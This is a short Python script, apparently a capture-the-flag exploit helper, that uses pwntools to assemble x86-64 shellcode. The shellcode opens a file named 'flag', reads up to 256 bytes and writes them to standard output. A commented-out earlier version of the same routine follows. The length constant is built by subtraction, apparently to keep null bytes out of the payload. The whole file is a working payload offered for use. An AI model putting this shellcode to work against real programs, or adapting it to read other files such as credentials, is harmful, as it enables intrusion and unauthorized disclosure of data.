from pwn import *
context.arch='amd64'

shellcode='''
push 0x0
push 0x67616c66

mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
mov rax,0x2
syscall

mov rax,0x0
mov rsi,rdi
mov rdi,0x3
mov rdx, 0x01010201
sub rdx, 0x01010101
syscall

mov rax,0x1
mov rdi,0x1
syscall
'''

#shellcode='''
#push 0x0
#push 0x67616c66
#mov rdi,rsp
#xor rsi,rsi
#xor rdx,rdx
#mov rax,0x2
#syscall
#
#mov rax,0x0
#mov rsi,rdi
#mov rdi,0x3
#mov rdx,0x100
#syscall
#
#mov rax,0x1
#mov rdi,0x1
#syscall
#'''

print(asm(shellcode))
